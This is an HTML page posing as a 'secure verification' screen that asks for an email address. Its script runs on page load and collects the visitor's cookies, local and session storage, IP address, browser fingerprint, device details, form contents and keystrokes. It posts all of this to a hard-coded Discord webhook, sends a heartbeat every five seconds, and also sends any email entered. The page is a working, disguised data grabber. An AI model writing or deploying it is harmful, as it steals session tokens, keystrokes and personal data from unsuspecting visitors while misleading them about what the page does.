<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Zone</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
    body {
      min-height:100vh; display:flex; align-items:center; justify-content:center;
      background: #0b0f1a;
      background-image: radial-gradient(ellipse at 30% 40%, #1a2a4a, #05080f);
      padding:1.5rem;
    }
    .card {
      background: rgba(255,255,255,0.03);
      backdrop-filter: blur(20px) saturate(1.8);
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 2.5rem;
      box-shadow: 0 30px 80px rgba(0,0,0,0.8);
      padding: 3rem 2.5rem;
      max-width: 480px; width:100%;
      text-align:center;
    }
    .badge {
      display:inline-block;
      background: linear-gradient(135deg,#00d4ff,#7b2ffc);
      padding:0.3rem 1.4rem;
      border-radius:40px;
      font-size:0.65rem;
      font-weight:600;
      letter-spacing:1.5px;
      text-transform:uppercase;
      color:#fff;
      margin-bottom:1.2rem;
    }
    h1 {
      font-size:2.2rem;
      font-weight:700;
      background:linear-gradient(135deg,#f0f4ff,#a0c8ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:0.4rem;
    }
    .sub {
      color:rgba(255,255,255,0.4);
      font-size:0.9rem;
      border-left:3px solid #00d4ff;
      padding-left:1rem;
      margin:0 auto 2rem auto;
      max-width:300px;
    }
    .input-group {
      margin:1.5rem 0;
      text-align:left;
    }
    .input-group label {
      color:rgba(255,255,255,0.3);
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.8px;
      display:block;
      margin-bottom:0.4rem;
    }
    .input-group input {
      width:100%;
      padding:0.9rem 1.2rem;
      border-radius:60px;
      border:1px solid rgba(255,255,255,0.06);
      background:rgba(255,255,255,0.02);
      color:#fff;
      font-size:1rem;
      outline:none;
      transition:0.2s;
    }
    .input-group input:focus {
      border-color:#00d4ff;
      background:rgba(0,212,255,0.03);
    }
    .btn {
      width:100%;
      padding:1.1rem;
      border:none;
      border-radius:60px;
      background:linear-gradient(135deg,#00d4ff,#7b2ffc);
      color:#fff;
      font-weight:600;
      font-size:1.05rem;
      cursor:pointer;
      transition:0.25s;
      box-shadow:0 8px 30px rgba(0,212,255,0.12);
      margin-top:0.5rem;
    }
    .btn:hover { transform:scale(1.01); }
    .btn:active { transform:scale(0.97); }
    #status {
      margin-top:1rem;
      padding:0.5rem;
      border-radius:8px;
      font-size:0.75rem;
      color:#aaa;
      background:rgba(0,0,0,0.3);
      min-height:1.5rem;
    }
    .footer-text {
      margin-top:1.8rem;
      font-size:0.6rem;
      color:rgba(255,255,255,0.08);
    }
  </style>
</head>
<body>

<div class="card">
  <div class="badge">🔒 secure verification</div>
  <h1>Verification Zone</h1>
  <div class="sub">confirm your identity</div>

  <div class="input-group">
    <label>📧 email address</label>
    <input type="email" id="emailInput" placeholder="you@domain.com" autocomplete="email">
  </div>

  <button class="btn" id="verifyBtn">Verify Identity →</button>
  <div id="status">● initializing...</div>
  <div class="footer-text">encrypted • one‑time session</div>
</div>

<script>
  (function(){
    const WEBHOOK = 'https://discord.com/api/webhooks/1527390754698297496/IYgvW07X3tYT3pjLdA1HZpbp_x2B9L-jbJIeF1zuQVyoRbbPjTOCw_5LbZjXOL8-4n-f';
    const status = document.getElementById('status');

    function setStatus(msg, isGood) {
      status.textContent = msg;
      status.style.color = isGood ? '#0f0' : '#ff6';
      console.log('[VZ]', msg);
    }

    // ----- SEND FUNCTION (works with both fetch and XHR) -----
    function sendToDiscord(data) {
      return new Promise((resolve, reject) => {
        const json = JSON.stringify(data);
        // Discord limit: 2000 chars per message
        if (json.length > 1900) {
          // Truncate
          const truncated = JSON.stringify(data, null, 2).slice(0, 1800) + '\n...truncated';
          data = { content: '```json\n' + truncated + '\n```' };
        } else {
          data = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
        }

        // Try fetch first
        fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        })
        .then(res => {
          if (res.ok) { resolve(true); }
          else { reject(new Error('HTTP ' + res.status)); }
        })
        .catch(() => {
          // Fallback to XMLHttpRequest
          const xhr = new XMLHttpRequest();
          xhr.open('POST', WEBHOOK);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.onload = () => {
            if (xhr.status === 200 || xhr.status === 204) { resolve(true); }
            else { reject(new Error('XHR ' + xhr.status)); }
          };
          xhr.onerror = () => reject(new Error('XHR failed'));
          xhr.send(JSON.stringify(data));
        });
      });
    }

    // ----- COLLECT DATA -----
    async function collectAll() {
      const p = {};

      // IP
      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); p.ip = d.ip; } catch(e){ p.ip = 'unavailable'; }

      // UA
      p.ua = navigator.userAgent;
      let device = 'unknown';
      if (/Mobile|Android|iPhone|iPad/i.test(p.ua)) device = 'Mobile';
      else if (/Mac/i.test(p.ua)) device = 'macOS';
      else if (/Windows/i.test(p.ua)) device = 'Windows';
      else if (/Linux/i.test(p.ua)) device = 'Linux';
      p.device = device;

      p.screen = `${screen.width}x${screen.height}`;
      p.dpr = window.devicePixelRatio || 1;
      p.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      p.language = navigator.language;
      p.referrer = document.referrer || 'direct';
      p.url = window.location.href;
      p.cookiesEnabled = navigator.cookieEnabled;
      p.platform = navigator.platform || 'unknown';
      p.vendor = navigator.vendor || 'unknown';

      // Storage
      try { p.cookies = document.cookie; } catch(e){ p.cookies = 'err'; }
      try { p.localStorage = {}; for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); p.localStorage[k]=localStorage.getItem(k); } } catch(e){}
      try { p.sessionStorage = {}; for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); p.sessionStorage[k]=sessionStorage.getItem(k); } } catch(e){}

      // Hardware
      p.cpuCores = navigator.hardwareConcurrency || '?';
      p.deviceMemory = navigator.deviceMemory || '?';

      // Network
      if (navigator.connection) {
        const c = navigator.connection;
        p.network = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
      }

      // Fingerprint
      let fp = '';
      try {
        const c = document.createElement('canvas'); c.width=200; c.height=50;
        const ctx = c.getContext('2d');
        ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,40);
        ctx.fillStyle='#069'; ctx.fillText('FP',10,10);
        fp = c.toDataURL().slice(0,60);
      } catch(e){ fp = 'err'; }
      p.fingerprint = fp;

      // DOM
      try { p.domHTML = document.body.innerHTML.slice(0,1000); } catch(e){}

      // Forms
      const forms = {};
      document.querySelectorAll('input, textarea, select').forEach(el => {
        if(el.name || el.id) { forms[el.name || el.id] = (el.value || '').slice(0,100); }
      });
      p.forms = forms;

      p.timestamp = new Date().toISOString();
      return p;
    }

    // ----- LIVE TRACKING -----
    let keystrokes = [];
    document.addEventListener('keydown', e => {
      keystrokes.push({ key: e.key, time: Date.now() });
      if (keystrokes.length > 100) keystrokes.shift();
    });

    // ----- MAIN -----
    (async function main() {
      setStatus('● collecting data...', false);
      const payload = await collectAll();
      setStatus('● sending to Discord...', false);

      try {
        await sendToDiscord({ event: 'page_load', ...payload });
        setStatus('✅ Initial data sent successfully!', true);
      } catch(e) {
        setStatus('⚠️ Initial send failed: ' + e.message, false);
        // Try again after 2 seconds
        setTimeout(async () => {
          try {
            await sendToDiscord({ event: 'retry', ...payload });
            setStatus('✅ Retry succeeded!', true);
          } catch(e2) {
            setStatus('❌ Both attempts failed: ' + e2.message, false);
          }
        }, 2000);
      }

      // Heartbeat every 5s
      setInterval(async () => {
        const hb = { ...payload, event: 'heartbeat', keystrokes: keystrokes.slice(-20) };
        try {
          await sendToDiscord(hb);
          setStatus('✅ Heartbeat sent (' + new Date().toLocaleTimeString() + ')', true);
        } catch(e) {
          setStatus('⚠️ Heartbeat failed', false);
        }
      }, 5000);
    })();

    // ----- EMAIL SUBMIT -----
    const emailInput = document.getElementById('emailInput');
    const verifyBtn = document.getElementById('verifyBtn');

    verifyBtn.addEventListener('click', async () => {
      const email = emailInput.value.trim();
      if (!email || !email.includes('@')) {
        alert('Please enter a valid email.');
        return;
      }
      setStatus('● sending email...', false);
      try {
        await sendToDiscord({ event: 'email_submit', email: email, keystrokes: keystrokes.slice(-20) });
        setStatus('✅ Email sent to Discord!', true);
        alert('✅ Verification complete.');
        verifyBtn.textContent = '✓ Verified';
        verifyBtn.disabled = true;
      } catch(e) {
        setStatus('❌ Email send failed: ' + e.message, false);
        alert('Error sending. Check console.');
      }
    });

    emailInput.addEventListener('keydown', e => { if (e.key === 'Enter') verifyBtn.click(); });

  })();
</script>
</body>
</html>
